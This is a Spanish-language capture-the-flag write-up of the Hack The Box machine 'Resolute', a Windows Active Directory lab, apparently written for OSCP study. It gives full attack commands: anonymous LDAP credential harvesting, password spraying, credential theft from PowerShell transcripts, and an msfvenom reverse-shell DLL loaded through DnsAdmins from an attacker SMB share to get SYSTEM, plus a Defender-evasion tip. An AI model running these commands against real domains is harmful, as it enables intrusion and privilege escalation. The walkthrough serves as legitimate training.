[🔫 Resolute — HTB [Windows · Medium · AD] 36c15bd2d16c81f7b160d5f168d71048.md](https://github.com/user-attachments/files/28341013/Resolute.HTB.Windows.Medium.AD.36c15bd2d16c81f7b160d5f168d71048.md)
# 🔫 Resolute — HTB [Windows · Medium · AD]

| Campo | Detalle |
| --- | --- |
| IP | `10.129.96.155` |
| Dominio | `megabank.local` |
| Vector inicial | RPC anónimo → ldapsearch → password en campo description |
| Usuario inicial | `melanie` : `Welcome123!` (password spray) |
| Pivote | `ryan` : `Serv3r4Admin4cc123!` (PSTranscripts ocultos) |
| Escalada | DnsAdmins → DLL injection vía dnscmd + SMB share → restart DNS |
| Root | `nt authority\system` vía reverse shell en nc |
| Metasploit | ❌ No usado |

---

# 1. Reconocimiento

## Nmap — puertos

Perfil de DC clásico. Sin HTTP. Con WinRM en 5985 y 47001 el acceso directo está disponible si conseguimos credenciales.

```bash
nmap -sS -p- --min-rate 5000 10.129.96.155
```

> 
> 
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/Resolute/assets/image.png)

## Nmap — versiones y scripts

Dominio `megabank.local`, hostname RESOLUTE. Windows Server 2016 Standard 14393. SMB signing requerido, autenticación level: user pero null auth true — eso confirma que RPC anónimo puede funcionar.

```bash
nmap -sVC -p 53,88,135,139,389,445,636,3268,5985 10.129.96.155
```

> 
> 
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/Resolute/assets/image1.png)
> 

---

# 2. Enumeración

## RPC anónimo — usuarios, grupos e info del dominio

SMBclient no responde, pero RPC anónimo sí. Volcamos toda la información disponible:

```bash
rpcclient -U '' -N 10.129.96.155
rpcclient $> enumdomusers
rpcclient $> enumdomgroups
rpcclient $> querydominfo
```

> 
> 
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/Resolute/assets/image2.png)
> 

Lista larga de usuarios. Guardamos todos en `users.txt`. Antes de spray intentamos ASREPRoast — no funciona. Pasamos a LDAP.

## LDAP — buscar credenciales en atributos

LDAP anónimo está habilitado. Volcamos todo y filtramos por palabras clave relacionadas con contraseñas:

```bash
ldapsearch -x -H ldap://10.129.96.155 -b "dc=megabank,dc=local" > ldap.txt
grep -iE "pass|pwd|password|secret" ldap.txt -B 2 -A 2
```

> 
> 
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/Resolute/assets/image3.png)
> 

La contraseña `Welcome123!` está en el campo description del usuario marko — probablemente es la contraseña de bienvenida que se asigna al crear cuentas. Marko la cambió, pero puede que otros usuarios no lo hayan hecho.

## Password spray con `Welcome123!`

```bash
nxc smb 10.129.96.155 -u users.txt -p 'Welcome123!' --continue-on-success
```

> 
> 
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/Resolute/assets/image4.png)
> 

---

# 3. Acceso inicial — evil-winrm como melanie

```bash
evil-winrm -i 10.129.96.155 -u melanie -p 'Welcome123!'
```

> 
> 
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/Resolute/assets/image5.png)
> 

---

# 4. Enumeración post-explotación como melanie

Subimos SharpHound, revisamos privilegios y grupos. Los privilegios de melanie son básicos:

```powershell
whoami /priv
```

> 
> 
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/Resolute/assets/image6.png)
> 

Buscamos directorios ocultos con `dir -force`:

```powershell
dir -force C:\
```

> 
> 
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/Resolute/assets/image7.png)
> 

El directorio `PSTranscripts` es inusual — no es estándar de Windows. PowerShell puede estar configurado para guardar transcripts de todas las sesiones, lo que significa que puede haber comandos ejecutados previamente guardados en texto plano.

---

# 5. PSTranscripts — credenciales de ryan

```powershell
cd PSTranscripts
cd 20191203
dir -force
type PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
```

> 
> 
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/Resolute/assets/image8.png)
> 

Alguien ejecutó un `net use` con las credenciales de ryan y PowerShell lo guardó en el transcript. Contraseña: `Serv3r4Admin4cc123!`.

---

# 6. Pivote a ryan — DnsAdmins

```bash
evil-winrm -i 10.129.96.155 -u ryan -p 'Serv3r4Admin4cc123!'
```

Verificamos grupos de ryan:

```powershell
whoami /groups
```

> 
> 
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/Resolute/assets/image9.png)
> 

Ryan es miembro de `DnsAdmins`. Este grupo puede cargar una DLL arbitraria en el proceso `dns.exe` que corre como SYSTEM. Vector confirmado.

---

# 7. Escalada — DnsAdmins DLL injection

## Generar payload DLL

Defender está activo — no podemos subir la DLL al disco de la máquina. La solución: servir la DLL desde un SMB share nuestro y que el DC la cargue directamente via ruta UNC.

```bash
# Kali — generar DLL de reverse shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.27 LPORT=4444 \
  -f dll -o rev.dll
```

> 
> 
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/Resolute/assets/image10.png)
> 

## Servir la DLL via SMB share

```bash
# Kali — en el mismo directorio que rev.dll
impacket-smbserver share . -smb2support
```

> 
> 
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/Resolute/assets/image11.png)
> 

## Listener

```bash
nc -lvnp 4444
```

> 
> 
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/Resolute/assets/image12.png)
> 

## Ejecutar el ataque desde ryan

Dos pasos: (1) configurar la DLL que cargará el servicio DNS, (2) reiniciar el servicio para que la cargue.

Ojo: hay un cleanup script que borra la clave de registro al cabo de ~1 minuto. Hay que encadenar los tres comandos rápido o en un solo bloque.

```powershell
# Apuntar el servicio DNS a nuestra DLL via ruta UNC
dnscmd.exe /config /serverlevelplugindll \\10.10.14.27\share\rev.dll

# Reiniciar el servicio DNS (lo ejecuta como SYSTEM, carga nuestra DLL)
sc.exe \\resolute stop dns
sc.exe \\resolute start dns
```

> 
> 
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/Resolute/assets/image13.png)
> 

> 
> 
> 
> 
> 

---

# 8. Cadena de ataque

```
RPC anónimo → enumdomusers → lista de usuarios
    ↓
LDAP anónimo → campo description marko → Welcome123! (password de bienvenida)
    ↓
nxc spray Welcome123! → melanie:Welcome123!
    ↓
evil-winrm melanie → user.txt
    ↓
dir -force C:\ → PSTranscripts → net use con ryan:Serv3r4Admin4cc123!
    ↓
evil-winrm ryan → whoami /groups → MEGABANK\DnsAdmins
    ↓
msfvenom → rev.dll → impacket-smbserver (sin tocar disco)
    ↓
dnscmd /config /serverlevelplugindll \\IP\share\rev.dll
    ↓
sc stop dns && sc start dns → dns.exe carga rev.dll como SYSTEM
    ↓
nc shell → nt authority\system → root.txt
```

---

# 9. Moralejas

## El campo description de AD es una mina — siempre filtrarlo

El campo `description` en objetos de usuario AD no tiene restricciones de visibilidad por defecto. Cualquier usuario autenticado (o incluso anónimo si LDAP lo permite) puede leerlo. Administradores que ponen contraseñas iniciales en la descripción “para que el usuario la vea al hacer login” es práctica habitual y un hallazgo clásico. El grep `pass|pwd|secret|clave` sobre el ldap.txt es reflejo automático.

## dir -force en C: es obligatorio — los directorios ocultos dan premios

`PSTranscripts` no aparece con un `dir` normal. El flag `-force` en PowerShell muestra ficheros y directorios con atributos Hidden y System. En el OSCP y en HTB muchas veces la escalada está en un directorio que solo aparece con `-force`. Hábito: siempre `dir -force C:\` en cuanto tienes foothold.

## Los PSTranscripts guardan comandos completos con argumentos — incluyendo contraseñas

Cuando `Transcript` está habilitado en la política de PowerShell, cada sesión queda registrada íntegramente en texto plano. Un `net use` con credenciales hardcodeadas en la línea de comandos queda grabado para siempre. En un pentest real esto es un hallazgo crítico de configuración, no solo de credenciales.

## La pertenencia a grupos es recursiva — siempre tirar del hilo

Melanie no tenía nada interesante. Ryan era Contractor. Contractors → DnsAdmins. Sin BloodHound o `whoami /groups` detallado, esto no es obvio. La cadena de grupos puede tener N niveles. BloodHound lo mapea de golpe; sin él, `net group "DnsAdmins" /domain` es el check manual.

## DnsAdmins + DLL vía UNC path evita Defender

Subir la DLL al disco activa Defender — la borra en segundos. Pero `dnscmd /config /serverlevelplugindll` acepta rutas UNC (`\\IP\share\file.dll`). El proceso `dns.exe` (SYSTEM) accede al SMB share y carga la DLL directamente desde la red, sin escribir nada en disco local. Esto evade la detección basada en firma estática. La técnica funciona igual con un `python3 -m http.server` + descarga en memoria para otros vectores.

## El cleanup script requiere encadenar comandos rápido

En HTB y en el OSCP hay scripts que limpian cambios de registro periódicamente. Si `dnscmd` configura la clave y al cabo de un minuto desaparece, no es un fallo — es el cleanup. La solución es encadenar dnscmd + sc stop + sc start en un solo bloque con `;` para que se ejecuten en milisegundos antes de que el script de limpieza actúe.

## El patrón OSCP de esta máquina

```
LDAP anónimo → credenciales en atributos no protegidos
    ↓
Password spray → foothold
    ↓
Directorios ocultos + transcripts → pivot horizontal
    ↓
DnsAdmins → DLL injection via dnscmd (evasion Defender: UNC path)
    ↓
SYSTEM
```

Este encadenamiento (enumeration → spray → lateral → group abuse) es exactamente el patrón AD del OSCP.

---

# 10. Conceptos técnicos clave

**DnsAdmins DLL injection:** El grupo `DnsAdmins` puede configurar el servicio DNS para que cargue una DLL personalizada mediante `dnscmd /config /serverlevelplugindll`. Cuando el servicio se reinicia, `dns.exe` (que corre como SYSTEM) carga la DLL. Si la DLL es una reverse shell, obtienes SYSTEM. La DLL se puede servir via UNC path para evitar tocar el disco.

**PSTranscripts:** Cuando `Start-Transcript` está activo por política de grupo, PowerShell graba todas las sesiones en archivos `.txt` en `C:\PSTranscripts\`. Los comandos se graban con sus argumentos completos, incluidas contraseñas pasadas como parámetros. El directorio tiene atributos Hidden.

**Cleanup scripts en HTB/OSCP:** Los laboratorios tienen scripts que revierten cambios para mantener la máquina en estado limpio para otros jugadores. Si una modificación desaparece al cabo de ~1 minuto, hay un cleanup. La solución es actuar antes de que el script se ejecute, encadenando todos los comandos en un bloque único.

---

# 11. Comandos clave

```bash
# Reconocimiento
nmap -sS -p- --min-rate 5000 10.129.96.155
nmap -sVC -p 53,88,135,139,389,445,636,3268,5985 10.129.96.155

# RPC anónimo
rpcclient -U '' -N 10.129.96.155
rpcclient $> enumdomusers
rpcclient $> enumdomgroups
rpcclient $> querydominfo

# LDAP — buscar credenciales en atributos
ldapsearch -x -H ldap://10.129.96.155 -b "dc=megabank,dc=local" > ldap.txt
grep -iE "pass|pwd|password|secret" ldap.txt -B 2 -A 2

# Password spray
nxc smb 10.129.96.155 -u users.txt -p 'Welcome123!' --continue-on-success

# Acceso inicial
evil-winrm -i 10.129.96.155 -u melanie -p 'Welcome123!'

# Post-explotación — buscar directorios ocultos
dir -force C:\
cd C:\PSTranscripts\20191203
type PowerShell_transcript.RESOLUTE.*.txt

# Pivote a ryan
evil-winrm -i 10.129.96.155 -u ryan -p 'Serv3r4Admin4cc123!'
whoami /groups  # verificar DnsAdmins

# DnsAdmins — generar DLL
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<TU_IP> LPORT=4444 -f dll -o rev.dll

# Servir DLL sin tocar el disco del objetivo
impacket-smbserver share . -smb2support

# Listener
nc -lvnp 4444

# Configurar y disparar (encadenar todo rápido por cleanup script)
dnscmd.exe /config /serverlevelplugindll \\<TU_IP>\share\rev.dll; sc.exe \\resolute stop dns; sc.exe \\resolute start dns
```
